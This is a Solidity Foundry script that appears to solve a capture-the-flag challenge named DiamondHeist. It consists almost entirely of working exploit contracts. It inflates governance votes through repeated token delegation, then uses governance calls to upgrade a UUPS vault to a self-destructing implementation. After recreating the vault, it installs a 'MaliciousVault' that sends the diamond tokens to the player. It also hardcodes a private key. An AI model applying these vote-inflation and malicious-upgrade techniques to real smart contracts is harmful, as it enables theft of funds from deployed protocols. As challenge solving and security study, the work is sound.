// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import {Challenge} from "../src/Challenge.sol";

import {HexensCoin} from "../src/HexensCoin.sol";
import {Diamond} from "../src/Diamond.sol";
import {Vault} from "../src/Vault.sol";
import {UUPSUpgradeable} from "../src/openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";


contract Exploit {
    function delegateAndTransfer(HexensCoin hexensCoin, address to) public {
        hexensCoin.delegate(to);
        hexensCoin.transfer(to, 10_000 ether);
    }
}

contract NewBurner {
    function burn(Diamond diamond, address to, uint256 amount) public {
        diamond.transfer(to, amount);
    }
}

contract MaliciousVault is UUPSUpgradeable {
    function transfer(Diamond diamond, address to, uint256 amount) public {
        NewBurner burner = new NewBurner();
        burner.burn(diamond, to, amount);
    }

    function _authorizeUpgrade(address) internal override view {
    }
}

contract NewVault is UUPSUpgradeable {

    function transfer() public {
        selfdestruct(payable(msg.sender));
    }

    function _authorizeUpgrade(address) internal override view {
    }
}


contract Exploiter {

    Challenge public challenge;
    constructor(address _challenge) {
        challenge = Challenge(_challenge);
    }

    function step1() external {
        challenge.claim();
        HexensCoin hexensCoin = challenge.hexensCoin();

        hexensCoin.delegate(address(this));

        for(uint i=0; i<11; i++){
            Exploit exploit = new Exploit();
            hexensCoin.transfer(address(exploit), 10_000 ether);
            exploit.delegateAndTransfer(hexensCoin, address(this));
        }

        Diamond diamond = challenge.diamond();

        NewVault newVault = new NewVault();
        Vault vault = challenge.vault();

        bytes memory burnCall = abi.encodeWithSelector(Vault.burn.selector, address(diamond), 31337);

        challenge.vault().governanceCall(burnCall);

        bytes memory data = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(newVault));

        challenge.vault().governanceCall(data);

        NewVault(address(challenge.vault())).transfer();


    }

    function step2(address player) external {
        HexensCoin hexensCoin = challenge.hexensCoin();

        Diamond diamond = challenge.diamond();


        console.log("code size of vault: ", address(challenge.vault()).code.length);

        challenge.vaultFactory().createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));

        challenge.vault().initialize(address(hexensCoin), address(diamond));

        MaliciousVault maliciousVault = new MaliciousVault();

        bytes memory data = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, address(maliciousVault), abi.encodeWithSelector(MaliciousVault.transfer.selector, diamond, player, 31337));

        challenge.vault().governanceCall(data);

    }
}


contract DiamondHeist is Script {
    Challenge public challenge;

    address user;

    function run() external {
        uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0x7c4764193e20ddd428d487b3920318523b32c80302cf92ab11f91bacc6bfc3ee));
        user = vm.addr(playerPrivateKey);

        vm.startBroadcast(playerPrivateKey);
        challenge = Challenge(0xE4B87C476d70315B7E577b8b5964d6CF84B8E3b4);
        
        // console.log("Challenge address:", address(challenge));
        Exploiter exploiter = Exploiter(0x744D712a82E8BDFeF89Bab45FcFcf1028f333eb7);
        exploiter.step1();
        // let another block get mined
        exploiter.step2(challenge.PLAYER());
        

        vm.stopBroadcast();
    }



}